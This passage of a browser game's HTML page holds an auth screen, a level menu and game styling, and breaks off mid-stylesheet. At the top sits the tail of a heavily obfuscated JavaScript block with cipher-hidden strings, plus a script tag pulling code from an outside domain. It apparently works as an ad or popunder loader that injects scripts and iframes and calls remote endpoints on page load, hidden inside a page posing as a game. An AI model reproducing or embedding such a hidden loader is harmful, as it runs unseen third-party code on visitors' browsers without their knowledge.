kr[e.hK](n)?n:eK[e.hK](n)?e.hM[e.CK](n):nK[e.hK](n)?e.Dk[e.CK](q[e.nj][e.Ib])[e.CK](n):q[e.nj][e.xb][e.Pk](e.iK)[e.kK](e.J,-e.U)[e.CK](n)[e.EK](e.iK)}function fK(){let n=[j[kn]][e.CK](ue[e.rb](re));return n[e.FK]((t,r)=>t&&n[e.LM](t)===r)}function uK(){return[...rK]}function en(n,t,r,f,u){let o=n[e.vM]();return f&&f!==se?o?o(t,r,f,u)[e.xj](M=>M)[e.RK](()=>en(n,t,r,f,u)):nn(t,r,f,u):o?re[o](t,r||e.Nb)[e.xj](M=>(j[kn]=o,M))[e.RK](()=>en(n,t,r,f,u)):new O((M,d)=>d())}function oK(n,t){X(e.qK);let r=e.ir,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.Kb)[e.CK](L(n));return Yr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function qK(n,t){X(e.mK);let r=e.wr,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.jb)[e.CK](L(n));return Qr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function nn(n,t,r,f){X(e.oK);let u=e.Ir,o=De(),M=e.Dk[e.CK](ne(),e.iK)[e.CK](o,e.OM);return Hr(M,n,t,r,f)[e.xj](d=>(ge(m,u),d))[e.RK](d=>{throw Ue(m,u,M),d})}function et(n,t,r,f){X(e.WM),wn(ne());let u=e.TK,o=Ht();return Or(o,n,t,r,f)[e.xj](M=>(ge(m,u),M))[e.RK](M=>{throw Ue(m,u,o),M})}function tn(n,t,r,f){n=KK(n),r=r?r[e.kb]():e.h;let u=r&&r!==se?uK():fK();return X(e.h[e.CK](r,e.m)[e.CK](n)),en(u,n,t,r,f)[e.xj](o=>o&&o[e.Nr]?o:e.MK(e.lb,e.wb,e.Nr,o))}var rn=e.sr,Kn=e.Dr,MK=e.Ar,dK=e.er,iK=e.tr,cK=e.yr,zK=e.Lr,aK=e.Nr,fn,un;function on(n){let t=n&&n[e.tM]&&n[e.tM][e.cM],r=n&&n[e.tM]&&n[e.tM][e.pM],f=n&&n[e.tM]&&n[e.tM][e.BM],u=n&&n[e.tM]&&n[e.tM][e.QM],o=n&&n[e.tM]&&n[e.tM][e.VM],M=n&&n[e.tM]&&n[e.tM][e.HM],d=n&&n[e.tM]&&n[e.tM][e.nM],b=n&&n[e.tM]&&n[e.tM][e.uM],p=b===m||b===F,l=e.MK();o!==rn&&o!==Kn||(r===MK?(l[e.pM]=dK,l[e.sb]=A,l[e.uM]=m,l[e.Db]=F):r===iK&&M&&(!b||p)&&(l[e.pM]=cK,l[e.HM]=M,tn(t,d,u,f)[e.xj](J=>{let E=e.MK();E[e.pM]=aK,E[e.cM]=t,E[e.HM]=M,E[e.tM]=J,qn(o,E)})[e.RK](J=>{let E=e.MK();E[e.pM]=zK,E[e.cM]=t,E[e.HM]=M,E[e.Fb]=J&&J[e.P],qn(o,E)})),l[e.pM]&&qn(o,l))}function qn(n,t){switch(t[e.VM]=n,n){case Kn:un[e.PK](t);break;case rn:default:fn[e.PK](t);break}q[e.PK](t,e.fK)}function bK(){try{fn=new zn(rn),fn[e.T](e.P,on),un=new zn(Kn),un[e.T](e.P,on)}catch(n){}q[e.T](e.P,on)}var nt=i[e.qr];function jK(n,t,r){return new O((f,u)=>{X(e.Ab);let o;if([e.d,e.i,e.Z][e.LM](A)>-e.U){o=i[e.pK](e.zM);let M=i[e.hE](n);o[e.fj]=r,o[e.Yk](M),o[e.vE](e.OE,m),o[e.vE](e.WE,Je(g(ln)));try{nt[e.JM][e.xE](o,nt)}catch(d){(i[e.BM]||i[e.PM])[e.Yk](o)}}else R(n);N(()=>(o!==void e.J&&o[e.JM][e.gk](o),Jn(t)?(X(e.aE),f()):u()))})}function mK(n,t){let r=n===e.U?sr():g(ln);return tn(r,e.v,e.v,e.v)[e.xj](f=>(f=f&&e.Nr in f?f[e.Nr]:f,f&&zr(m,f),f))[e.RK](()=>ar(m))[e.xj](f=>{f&&jK(f,n,t)})}It();function Pe(n){return Jn()?e.v:(X(e.yM),Wt(),tt(n))}function tt(n){return A===e.U&&We()&&Ie(m),Re()?(Ve(),q[wt]=tn,Yn()[e.xj](t=>{if(t&&A===e.U){let r=new q[e.Tj];r[e.Pj](e.Yr,e.Dk[e.CK](t)),r[e.rM](Er,m),In(t),r[e.fj]=()=>{let f=i[e.pK](e.zM),u=i[e.hE](r[e.Nr][e.sk](e.yj(e.kY,e.qM),o()));f[e.fj]=n;function o(){let M=e.jY[e.CK](c[e.A]()[e.IK](e.lK)[e.kK](e.V));return q[M]=q[e.Ub],M}f[e.Yk](u),(i[e.BM]||i[e.PM])[e.Yk](f),N(()=>{f!==void e.J&&(f[e.JM][e.gk](f),qe())})},r[e.xk]();return}mK(A,n)[e.xj](()=>{En([m,F],ne())})})):N(tt,e.ok)}function EK(){We()&&Ie(F),St(n=>{try{return n&&We()&&(qe(),Ie(m)),wr(),Yn(!e.J)[e.xj](t=>{Mn(n,t)})[e.RK](()=>{Mn(n)})}catch(t){return Mn(n)}})}function Mn(n,t){let r=t||g(yn);In(r);let f=i[e.pK](e.zM);f[e.Rr]=()=>{qe(),Pe()},f[e.fj]=()=>{qe()},f[e.Ek]=e.gM[e.CK](r,e.Jb)[e.CK](n?m:F),(i[e.BM]||i[e.PM])[e.Yk](f)}q[Lt]=Pe,q[Xt]=Pe,N(Pe,e.Fr),Bn(Fe,Te),Bn(ce,Ne),bK(),Zt&&A===e.U&&EK();try{$}catch(n){}})()})(ue.entries({x:"AzOxuow",r:"Bget zafuruomfuaz (TFFB)",K:"Bget zafuruomfuaz (TFFBE)",j:"Bget zafuruomfuaz (Pagnxq Fms)",k:"Uzfqdefufumx",M:"Zmfuhq",b:"Uz-Bmsq Bget",E:"azoxuow",Y:"zmfuhq",S:"bgetqd-gzuhqdemx",g:"qz",C:"rd",G:"pq",h:"",v:null,O:"e",W:"o",c:"v",p:"k",B:"b",Q:"j",V:2,H:"oxuow",n:"fagot",u:"7.0.9",z:"lrsbdajktffb",a:"lrsradymfe",X:"radQmot",J:0,U:1,d:4,Z:5,i:3,w:6,I:7,l:"g",s:"fdkFab",D:"sqfBmdqzfZapq",A:"dmzpay",e:"fuyqe",t:"ogddqzf",y:"dqmpk",L:"pmfq",N:"fxp",F:"\r\n",q:",",R:"F",m:":",o:"dmi",T:"mppQhqzfXuefqzqd",P:"yqeemsq",f:"yspn9a79sh",xr:"q5qedx1ekg5",rr:"Fawqz",Kr:"Rmhuoaz",jr:"Oazfqzf-Fkbq",kr:"fqjf/tfyx",Mr:"mbbxuomfuaz/veaz",br:"veaz",Er:"nxan",Yr:"SQF",Sr:"BAEF",gr:"TQMP",Cr:"mbbxuomfuaz/j-iii-rady-gdxqzoapqp; otmdeqf=GFR-8",Gr:"Mooqbf-Xmzsgmsq",hr:"j-mbbxuomfuaz-wqk",vr:"j-mbbxuomfuaz-fawqz",Or:"__PX_EQEEUAZ_",Wr:"lrspxbabgb",cr:"puh",pr:999999,Br:"gdx(pmfm:uymsq/sur;nmeq64,D0xSAPxtMCMNMUMMMMMMMB///kT5NMQMMMMMXMMMMMMNMMQMMMUNDMM7)",Qr:"xuzw",Vr:"efkxqetqqf",Hr:"mzazkyage",nr:"fqjf/oee",ur:"lUzpqj",zr:"nmowsdagzpUymsq",ar:"zdm8od49pds",Xr:"r",Jr:"gzwzaiz",Ur:"PQXUHQDK_VE",dr:"PQXUHQDK_OEE",Zr:"BDAJK_VE",ir:"BDAJK_OEE",wr:"BDAJK_BZS",Ir:"BDAJK_JTD",lr:"f4wp70p8osq",sr:"gwtrajlpasc",Dr:"wmtityzzu",Ar:"buzs",er:"bazs",tr:"dqcgqef",yr:"dqcgqef_mooqbfqp",Lr:"dqcgqef_rmuxqp",Nr:"dqebazeq",Fr:1e4,qr:"ogddqzfEodubf",Rr:"azqddad",mr:1e3,or:"zmh",Tr:42,Pr:36e5,fr:"geqdMsqzf",xK:"efkxq",rK:"mzpdaup",KK:"u",jK:"iuzpaie zf",kK:"exuoq",MK:function(){let e={},q=[].slice.call(arguments);for(let i=0;i<q.length-1;i+=2)e[q[i]]=q[i+1];return e},bK:"bmdeq",EK:"vauz",YK:"([^m-l0-9]+)",SK:"xqzsft",gK:"__BBG_EQEEUAZ_1_",CK:"oazomf",GK:"_rmxeq",hK:"fqef",vK:"yageqpaiz",OK:"yageqgb",WK:"fagotqzp",cK:"fagotefmdf",pK:"odqmfqQxqyqzf",BK:"^tffbe?:",QK:"^//",VK:"^/",HK:48,nK:9,uK:"0",zK:"dqyahqQhqzfXuefqzqd",aK:"up",XK:"fmdsqfUp",JK:"tqustf",UK:"iuz",dK:"pao",ZK:"paoQxqyqzf",iK:"/",wK:".tfyx",IK:"faEfduzs",lK:36,sK:"dqpgoq",DK:".",AK:"!",eK:"//vayfuzsu.zqf/mbg.btb?lazqup=",tK:"&ar=1",yK:"ymfot",LK:10,NK:"ymb",FK:"ruxfqd",qK:"dqcgqefNkOEE",RK:"omfot",mK:"dqcgqefNkBZS",oK:"dqcgqefNkJTD",TK:"BDAJK_RDMYQ",PK:"baefYqeemsq",fK:"*",xj:"ftqz",rj:57,Kj:"rdayOtmdOapq",jj:35,kj:768,Mj:1024,bj:568,Ej:360,Yj:1080,Sj:736,gj:900,Cj:864,Gj:812,hj:667,vj:800,Oj:240,Wj:300,cj:"qz-GE",pj:"qz-SN",Bj:"qz-OM",Qj:"qz-MG",Vj:"eh-EQ",Hj:"bget",nj:"xaomfuaz",uj:"eodqqz",zj:"dqhqdeq",aj:"eod",Xj:"1bj",Jj:"mnagf:nxmzw",Uj:"BTB",dj:"VE",Zj:18e5,ij:"uBtazq|uBmp|uBap",wj:"Hqdeuaz\\/[^E]+Emrmdu",Ij:"rudqraj",lj:"su",sj:"mffmotQhqzf",Dj:"oeeDgxqe",Aj:"otmdOapqMf",ej:97,tj:122,yj:function(e,q){return new z(e,q)},Lj:60,Nj:120,Fj:480,qj:180,Rj:720,mj:"sqfFuyqlazqArreqf",oj:"bab",Tj:"JYXTffbDqcgqef",Pj:"abqz",fj:"azxamp",xk:"eqzp",rk:"fab",Kk:"lazqUp",jk:"radymf",kk:"urdmyq",Mk:"iupft",bk:"abmoufk",Ek:"edo",Yk:"mbbqzpOtuxp",Sk:"omxx",gk:"dqyahqOtuxp",Ck:
        "B",Gk:"Z",hk:"B/Z",vk:"Z/B",Ok:"B/Z/Z",Wk:"Z/B/Z",ck:"B/Z/B/Z",pk:"Z/Z/Z/Z",Bk:"00",Qk:"000",Vk:"0000",Hk:"00000",nk:"zqie",uk:"bmsqe",zk:"iuwu",ak:"ndaieq",Xk:"huqi",Jk:"yahuq",Uk:"mdfuoxq",dk:"mdfuoxqe",Zk:"efmfuo",ik:"bmsq",wk:"uzpqj",Ik:"iqn",lk:"rxaad",sk:"dqbxmoq",Dk:"tffbe://",Ak:3571,ek:"ep",tk:"sgy",yk:"bwqk",Lk:"befduzs",Nk:"begrrujqe",Fk:"mfan",qk:"DqsQjb",Rk:"pqoapqGDUOaybazqzf",mk:"Ymft",ok:100,Tk:2147483647,Pk:"ebxuf",fk:"puebmfotQhqzf",xM:"sqfFuyq",rM:"eqfDqcgqefTqmpqd",KM:"Otdayq\\/([0-9]{1,})",jM:"OduAE\\/([0-9]{1,})",kM:"Mzpdaup",MM:"Rudqraj",bM:56,EM:"rujqp",YM:"mgfa",SM:"oazfqzf",gM:"//",CM:"/qhqzf",GM:"&",hM:"tffbe:",vM:"eturf",OM:".veaz",WM:"dqcgqefNkUrdmyq",cM:"gdx",pM:"fkbq",BM:"napk",QM:"yqftap",VM:"otmzzqx",HM:"dqcgqef_up",nM:"dqebazeqFkbq",uM:"lazqup_mpnxaow",zM:"eodubf",aM:"rb",XM:"fzqyqxQfzqygoap",JM:"bmdqzfZapq",UM:16807,dM:"mnopqrstuvwxyzabcdefghijkl",ZM:27,iM:"baeufuaz",wM:"xqrf",IM:"dustf",lM:"naffay",sM:"bauzfqdQhqzfe",DM:"uzoxgpqe",AM:".iupsqf-oax-10-eb",eM:"faXaiqdOmeq",tM:"pmfm",yM:"efmdfXampuzs",LM:"uzpqjAr",NM:"pmfmeqf",FM:"oazfqzfIuzpai",qM:"s",RM:"Mphqdf1",mM:"MMN ",oM:" ",TM:"mbbxk",PM:"paogyqzfQxqyqzf",fM:"eqxqofadFqjf",xb:"tdqr",rb:"wqke",Kb:".oee?",jb:".bzs?",kb:"faGbbqdOmeq",Mb:"hqdeuaz",bb:"eagdoqLazqUp",Eb:"paymuz",Yb:"sqzqdmfuazFuyq",Sb:"qjfdm",gb:"|",Cb:"lazqup",Gb:"dqrqddqd",hb:"fuyq_purr",vb:"rmuxqp_gdx",Ob:"rmux_fuyq",Wb:"geqd_up",cb:"ogddqzf_gdx",pb:"xmef_egooqee",Bb:"egooqee_oagzf",Qb:"geqd_msqzf",Vb:"eodqqz_iupft",Hb:"eodqqz_tqustf",nb:"fuyqlazq",ub:"rmuxqp_gdx_paymuz",zb:"dqrqddqd_paymuz",ab:"ogddqzf_gdx_paymuz",Xb:"ndaieqd_xmzs",Jb:"/5/",Ub:"paogyqzf",db:"eqxqofad",Zb:"oazfqzfPaogyqzf",ib:"tqmp",wb:200,Ib:"taef",lb:"efmfge",sb:"omxxeusz",Db:"lazqup_adusuzmx",Ab:"efmdfUzvqofEodubfOapq",eb:"ruzp",tb:"geq-odqpqzfumxe",yb:"xmzsgmsq",Lb:"geqdXmzsgmsq",Nb:"fqjf",Fb:"qddad",qb:"sqfQxqyqzfeNkFmsZmyq",Rb:"eagdeqPuh",mb:"dqxmfuhq",ob:"hmxgq",Tb:"efkxqEtqqfe",Pb:"dqx",fb:"odaeeAdusuz",xE:"uzeqdfNqradq",rE:"iuftOdqpqzfumxe",KE:"bdafafkbq",jE:"%",kE:"rudefOtuxp",ME:2e3,bE:"sqfMxxDqebazeqTqmpqde",EE:"bai",YE:"6g90tD4d4Dd1r8xzjbbl",SE:"bdqhqzfPqrmgxf",gE:"efabUyyqpumfqBdabmsmfuaz",CE:"=",GE:"anvqof",hE:"odqmfqFqjfZapq",vE:"eqfMffdungfq",OE:"pmfm-lazq-up",WE:"pmfm-paymuz",cE:"faUEAEfduzs",pE:"?pahd=fdgq",BE:"efduzsurk",QE:"pdmiUymsq",VE:"fduy",HE:"[\\d\\z]+",nE:"/4/",uE:16,zE:12,aE:"qzpUzvqofEodubfOapq",XE:"nxaow",JE:"omzhme",UE:"sqfOazfqjf",dE:"2p",ZE:"sqfUymsqPmfm",iE:"efmfge_oapq",wE:"puebxmk",IE:30,lE:5e3,sE:"oxaeqp",DE:"f",AE:"baef",eE:"tqmpqde",tE:"qddad.oay",yE:"egnefduzs",LE:"eturfEfduzs ",NE:"ruxx",FE:"pmfq:",qE:32,RE:204,mE:"' ituxq dqcgqefuzs ",oE:": ",TE:"fuyqagf",PE:256,fE:"efmfgeFqjf",xY:"qddad dqcgqef fuyqagf",rY:"qddad '",KY:8,jY:"_",kY:"paogyqzf\\n"}).reduce((e,q)=>(ue.defineProperty(e,q[0],{get:()=>typeof q[1]!="string"?q[1]:q[1].split("").map(i=>{let w=i.charCodeAt(0);return w>=65&&w<=90?v.fromCharCode((w-65+26-12)%26+65):w>=97&&w<=122?v.fromCharCode((w-97+26-12)%26+97):i}).join("")}),e),{}),window,qt,h)});})();</script><script src="//yohle.com/ntfc.php?p=9905327" data-cfasync="false" async onerror="_sjyxbp()" onload="_swbcpuxw()"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Auth Screen Styles */
        .auth-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            z-index: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .auth-container {
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .auth-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .auth-title {
            font-size: 28px;
            font-weight: 800;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .auth-subtitle {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }

        .auth-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .auth-input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .auth-label {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
            font-weight: 500;
        }

        .auth-input {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            color: white;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s ease;
        }

        .auth-input:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 0 3px rgba(0,212,255,0.2);
            background: rgba(255,255,255,0.15);
        }

        .auth-input::placeholder {
            color: rgba(255,255,255,0.5);
        }

        .auth-button {
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 10px;
        }

        .auth-button:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,212,255,0.4);
        }

        .auth-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .auth-toggle {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }

        .auth-link {
            color: #00d4ff;
            cursor: pointer;
            text-decoration: none;
            font-weight: 500;
        }

        .auth-link:hover {
            text-decoration: underline;
        }

        .auth-error {
            background: rgba(244,67,54,0.2);
            border: 1px solid rgba(244,67,54,0.4);
            color: #ff6b6b;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            text-align: center;
        }

        .auth-success {
            background: rgba(76,175,80,0.2);
            border: 1px solid rgba(76,175,80,0.4);
            color: #81c784;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            text-align: center;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s ease-in-out infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .guest-option {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.2);
        }

        .guest-button {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            color: rgba(255,255,255,0.8);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .guest-button:hover {
            background: rgba(255,255,255,0.15);
            color: white;
        }

        .logout-btn {
            background: rgba(244,67,54,0.2);
            border: 1px solid rgba(244,67,54,0.4);
            color: #ff6b6b;
        }

        .logout-btn:hover {
            background: rgba(244,67,54,0.3);
        }

        /* Menu Screen Styles */
        .menu-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            z-index: 500;
            overflow-y: auto;
            display: none;
        }
        
        .career-level {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            margin-bottom: 8px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
            position: relative;
        }

        .career-level.unlocked {
            background: rgba(76,175,80,0.2);
            border-color: rgba(76,175,80,0.4);
        }

        .career-level.current {
            background: linear-gradient(135deg, rgba(255,193,7,0.3), rgba(255,152,0,0.3));
            border-color: rgba(255,193,7,0.6);
            box-shadow: 0 0 20px rgba(255,193,7,0.2);
        }

        .career-level.locked {
            background: rgba(255,255,255,0.05);
            border-color: rgba(255,255,255,0.1);
            opacity: 0.6;
        }

        @keyframes current-pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .background-pattern {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(circle at 25% 25%, rgba(255,255,255,0.08) 1px, transparent 1px),
                radial-gradient(circle at 75% 75%, rgba(255,255,255,0.04) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: 1;
        }
        
        .menu-content {
            position: relative;
            z-index: 2;
            padding: 40px 20px 20px;
            max-width: 400px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .hero-section {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .app-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 8px 24px rgba(0,212,255,0.2);
            border: 2px solid rgba(255,255,255,0.1);
        }
        
        .app-title {
            font-size: 32px;
            font-weight: 800;
            color: #ffffff;
            margin-bottom: 8px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .app-tagline {
            font-size: 16px;
            color: rgba(255,255,255,0.8);
            font-weight: 400;
        }
        
        .floating-card {
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
        }
        
        .menu-user-info {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .menu-user-name {
            font-size: 20px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 12px;
        }
        
        .menu-level-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .menu-level-circle {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff9800, #f57c00);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
            box-shadow: 0 4px 12px rgba(255,152,0,0.3);
            border: 2px solid rgba(255,255,255,0.2);
        }
        
        .menu-progress-info {
            flex: 1;
            max-width: 140px;
        }
        
        .menu-progress-bar {
            background: rgba(255,255,255,0.2);
            height: 6px;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 6px;
        }
        
        .menu-progress-fill {
            background: linear-gradient(90deg, #00ff00, #32ff32);
            height: 100%;
            border-radius: 3px;
            box-shadow: 0 0 8px rgba(0,255,0,0.3);
            transition: width 0.5s ease;
        }
        
        .menu-progress-text {
            font-size: 11px;
            color: rgba(255,255,255,0.8);
        }
        
        .menu-stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        
        .menu-stat-card {
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 16px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .menu-stat-number {
            font-size: 20px;
            font-weight: 700;
            color: #00ff00;
            margin-bottom: 4px;
        }
        
        .menu-stat-label {
            font-size: 12px;
            color: rgba(255,255,255,0.7);
        }
        
        .menu-section-title {
            font-size: 14px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 12px;
            text-align: center;
        }
        
        .menu-difficulty-pills {
            display: flex;
            gap: 8px;
            padding: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 12px;
        }
        
        .menu-difficulty-pill {
            flex: 1;
            padding: 10px;
            text-align: center;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            color: rgba(255,255,255,0.7);
        }
        
        .menu-difficulty-pill.active {
            background: linear-gradient(135deg, #2196F3, #1976D2);
            color: white;
            box-shadow: 0 2px 8px rgba(33,150,243,0.3);
        }
        
        .menu-main-actions {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .menu-action-btn {
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            color: white;
            border: none;
            padding: 18px 24px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 16px rgba(0,212,255,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .menu-action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,212,255,0.4);
        }
        
        .menu-secondary-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
        }
        
        .menu-secondary-btn {
            background: rgba(255,255,255,0.08);
            color: white;
            border: 1px solid rgba(255,255,255,0.15);
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        
        .menu-secondary-btn:hover {
            background: rgba(255,255,255,0.12);
            transform: translateY(-1px);
        }
        
        .menu-version-info {
            text-align: center;
            margin-top: 20px;
            font-size: 10px;
            color: rgba(255,255,255,0.4);
        }
        
        /* Game Screen Styles */
        .game-screen {
            display: none;
            padding: 20px;
            min-height: 100vh;
        }
        
        .header {
            text-align: center;
            margin-bottom: 12px;
        }
        
        .user-profile {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0,0,0,0.4);
            padding: 10px 15px;
            border-radius: 10px;
            margin-bottom: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            height: 50px;
        }
        
        .profile-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .username-display {
            color: #00ff00;
            font-weight: bold;
            font-size: 16px;
        }
        
        .level-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .level-badge {
            background: linear-gradient(145deg, #ff9800, #f57c00);
            color: white;
            padding: 4px 12px;
            border-radius: 15px;
            font-weight: bold;
            font-size: 12px;
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .coins-display {
            background: linear-gradient(135deg, #ffd700, #ffb300);
            color: #000;
            padding: 4px 10px;
            border-radius: 12px;
            font-weight: bold;
            font-size: 11px;
            border: 1px solid rgba(255,255,255,0.3);
            margin-left: 10px;
        }
        
        .xp-bar-container {
            width: 100px;
            height: 6px;
            background: rgba(255,255,255,0.2);
            border-radius: 3px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .xp-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #32ff32);
            border-radius: 3px;
            transition: width 0.5s ease;
            box-shadow: 0 0 8px rgba(0,255,0,0.3);
        }
        
        .xp-text {
            color: #ffffff;
            font-size: 10px;
        }
        
        .profile-buttons {
            display: flex;
            gap: 10px;
        }
        
        .profile-btn {
            background: #673AB7;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 11px;
            transition: all 0.2s ease;
        }
        
        .profile-btn:hover {
            background: #5E35B1;
            transform: translateY(-1px);
        }
        
        .asset-tabs {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .tab-button {
            background: rgba(0,0,0,0.6);
            color: white;
            border: 1px solid rgba(255,255,255,0.2);
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 8px 8px 0 0;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            position: relative;
            font-size: 11px;
        }
        
        .tab-button:hover {
            background: rgba(255,255,255,0.1);
            transform: translateY(-1px);
        }
        
        .tab-button.active {
            background: linear-gradient(145deg, #2196F3, #1976D2);
            border-color: rgba(255,255,255,0.4);
            box-shadow: 0 3px 8px rgba(33,150,243,0.3);
        }
        
        .tab-button.powerups {
            background: linear-gradient(135deg, #9C27B0, #7B1FA2);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            border-radius: 12px;
            margin-left: 15px;
            border: 2px solid rgba(156,39,176,0.3);
            box-shadow: 0 3px 12px rgba(156,39,176,0.2);
        }
        
        .tab-button.powerups:hover {
            background: linear-gradient(135deg, #AB47BC, #8E24AA);
            box-shadow: 0 4px 16px rgba(156,39,176,0.4);
        }
        
        .tab-button.powerups.active {
            background: linear-gradient(135deg, #E91E63, #C2185B);
            border-color: rgba(233,30,99,0.6);
            box-shadow: 0 4px 16px rgba(233,30,99,0.4);
        }
        
        .breach-badge {
            position: absolute;
            top: -8px;
            right: -8px;
            background: linear-gradient(145deg, #ff9800, #f57c00);
            color: white;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            font-size: 10px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba(255,255,255,0.8);
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            animation: badge-pulse 2s ease-in-out infinite;
        }
        
        @keyframes badge-pulse {
            0%, 100% { 
                transform: scale(1);
                box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            }
            50% { 
                transform: scale(1.1);
                box-shadow: 0 3px 8px rgba(255,152,0,0.4);
            }
        }
        
        .score-board {
        display: flex;
        justify-content: space-between;
         margin-bottom: 10px; /* Reduced from 20px */
         padding: 8px 15px; /* Reduced from 10px */
         background: rgba(0,0,0,0.3);
         border-radius: 5px;
